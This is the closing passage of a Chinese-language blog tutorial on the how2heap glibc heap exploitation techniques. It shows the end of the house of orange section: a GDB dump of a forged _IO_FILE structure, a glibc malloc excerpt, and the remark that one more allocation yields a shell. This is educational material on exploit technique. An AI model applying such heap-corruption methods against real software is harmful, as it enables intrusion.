class="line">0x6024e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">PwnLife&gt; p *((struct _IO_FILE_plus *) 0x602400)</span><br><span class="line"><span class="variable">$20</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175,</span><br><span class="line">    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;,</span><br><span class="line">    _IO_read_end = 0x7ffff7dd1b58 &lt;main_arena+88&gt; <span class="string">&quot;\020@b&quot;</span>,</span><br><span class="line">    _IO_read_base = 0x7ffff7dd24f0 <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_write_base = 0x2 &lt;error: Cannot access memory at address 0x2&gt;,</span><br><span class="line">    _IO_write_ptr = 0x3 &lt;error: Cannot access memory at address 0x3&gt;,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x0,</span><br><span class="line">    _fileno = 0,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 4196215,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _lock = 0x0,</span><br><span class="line">    _offset = 0,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x0,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="built_in">times</span>&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x602460</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>最后随意分配一个 chunk，由于 <code>size&lt;= 2*SIZE_SZ</code>，所以会触发 <code>_IO_flush_all_lockp</code> 中的 <code>_IO_OVERFLOW</code> 函数，获得 shell。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">            || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">          malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                           chunk2mem (victim), av);</span><br><span class="line">        size = chunksize (victim)</span><br></pre></td></tr></table></figure>



<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>关于how2heap 中 glibc 2.25的内容就到这里结束了。</p>
<p>关于 glibc 2.26 更多到是一些新版本 glibc 的check的bypass…就不准备再写成文章发出来了。</p>
</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Si us plau, activa JavaScript per poder veure el contingut.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/link">Links</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Educational-Heap-Exploitation"><span class="toc-number">1.</span> <span class="toc-text">Educational Heap Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-first-fit"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 first_fit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-fastbin-dup"><span class="toc-number">1.2.</span> <span class="toc-text">0x2 fastbin_dup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-fastbin-dup-into-stack"><span class="toc-number">1.3.</span> <span class="toc-text">0x3 fastbin_dup_into_stack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-fastbin-dup-consolidate"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 fastbin_dup_consolidate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-unsafe-unlink"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 unsafe_unlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-house-of-spirit"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 house_of_spirit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-poison-null-byte"><span class="toc-number">1.7.</span> <span class="toc-text">0x07 poison_null_byte</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.8.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x08-house-of-lore"><span class="toc-number">1.9.</span> <span class="toc-text">0x08 house_of_lore</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x09-overlapping-chunks"><span class="toc-number">1.10.</span> <span class="toc-text">0x09 overlapping_chunks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x10-overlapping-chunks-2"><span class="toc-number">1.11.</span> <span class="toc-text">0x10 overlapping_chunks_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x11-house-of-force"><span class="toc-number">1.12.</span> <span class="toc-text">0x11 house_of_force</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x12-unsorted-bin-into-stack"><span class="toc-number">1.13.</span> <span class="toc-text">0x12 unsorted_bin_into_stack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x13-unsorted-bin-attack"><span class="toc-number">1.14.</span> <span class="toc-text">0x13 unsorted_bin_attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x14-house-of-einherjar"><span class="toc-number">1.15.</span> <span class="toc-text">0x14 house_of_einherjar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x15-house-of-orange"><span class="toc-number">1.16.</span> <span class="toc-text">0x15 house of orange</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.17.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/Educational_Heap_Exploitation.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/Educational_Heap_Exploitation.html&text=Educational Heap Exploitation"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/Educational_Heap_Exploitation.html&title=Educational Heap Exploitation"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/Educational_Heap_Exploitation.html&is_video=false&description=Educational Heap Exploitation"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Educational Heap Exploitation&body=Check out this article: https://bestwing.me/Educational_Heap_Exploitation.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/Educational_Heap_Exploitation.html&title=Educational Heap Exploitation"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/Educational_Heap_Exploitation.html&title=Educational Heap Exploitation"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/Educational_Heap_Exploitation.html&title=Educational Heap Exploitation"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/Educational_Heap_Exploitation.html&title=Educational Heap Exploitation"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/Educational_Heap_Exploitation.html&name=Educational Heap Exploitation&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/Educational_Heap_Exploitation.html&t=Educational Heap Exploitation"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2020
    Swing
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/link">Links</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-133464311-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-133464311-1');
    </script>

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'swing';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


</body>
</html>
